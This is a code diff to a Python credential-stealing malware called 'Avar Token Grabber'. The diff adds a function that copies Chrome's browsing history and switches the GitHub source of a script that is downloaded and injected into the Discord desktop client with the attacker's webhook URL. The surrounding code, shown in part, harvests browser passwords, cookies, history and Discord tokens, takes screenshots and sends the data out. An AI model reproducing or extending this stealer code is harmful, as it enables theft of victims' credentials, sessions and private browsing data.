@@ -42,6 +42,7 @@ class Avar_Grabber:
             self.edgecookies()
             self.edgehist()
             self.edgepsw()
+            self.grabhist()
         self.grabTokens()
         self.screenshot()
         self.SendInfo()
@@ -73,7 +74,7 @@ class Avar_Grabber:
                         os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Avar"))
                     except FileNotFoundError:
                         pass
-                    f = requests.get("https://raw.githubusercontent.com/Sarahh731/Injectionn/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
+                    f = requests.get("https://raw.githubusercontent.com/Cl1ckerr/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
                     with open(directory_list, 'w', encoding="utf-8") as index_file:
                         index_file.write(f)
         for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
@@ -115,10 +116,10 @@ class Avar_Grabber:
             return decrypted_pass
         except:
             return "Encrypted Dick"
-    
+
     def grabPassword(self):
         master_key = self.get_master_key()
-        f = open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore')
+        f = open(self.tempfolder+"\\Chrome Passwords.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made by Cl1cker | https://github.com/Cl1ckerr/Avar-Token-Grabber\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
         try:
@@ -215,10 +216,38 @@ class Avar_Grabber:
         except:
             pass
 
+
     def edgehist(self):
         f = open(self.tempfolder+"\\Edge History.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made by Sarah | https://github.com/Sarahh731/Avar-Token-Grabber\n\n")
         login_db = self.appdata+'\\Microsoft\\Edge\\User Data\\Default\\History'
+        try:
+            shutil.copy2(login_db, "Loginvault.db")
+        except FileNotFoundError:
+            pass
+        conn = sqlite3.connect("Loginvault.db")
+        cursor = conn.cursor()
+        try:
+            cursor.execute("SELECT title, url FROM urls")
+            for r in cursor.fetchall():
+                url = r[0]
+                title = r[1]
+                if url != "":
+                    f.write(f"URL: {title}\nTitle: {url}\n\n")
+        except:
+            pass
+        f.close()
+        cursor.close()
+        conn.close()
+        try:
+            os.remove("Loginvault.db")
+        except:
+            pass
+
+    def grabhist(self):
+        f = open(self.tempfolder+"\\Chrome History.txt", "w", encoding="cp437", errors='ignore')
+        f.write("Made by Sarah | https://github.com/Sarahh731/Avar-Token-Grabber\n\n")
+        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\History'
         try:
             shutil.copy2(login_db, "Loginvault.db")
         except FileNotFoundError:
@@ -340,7 +369,7 @@ class Avar_Grabber:
 
     def grabCookies(self):
         master_key = self.get_master_key()
-        f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
+        f = open(self.tempfolder+"\\Chrome Cookies.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made by Sarah | https://github.com/Sarahh731/Avar-Token-Grabber\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
         try:
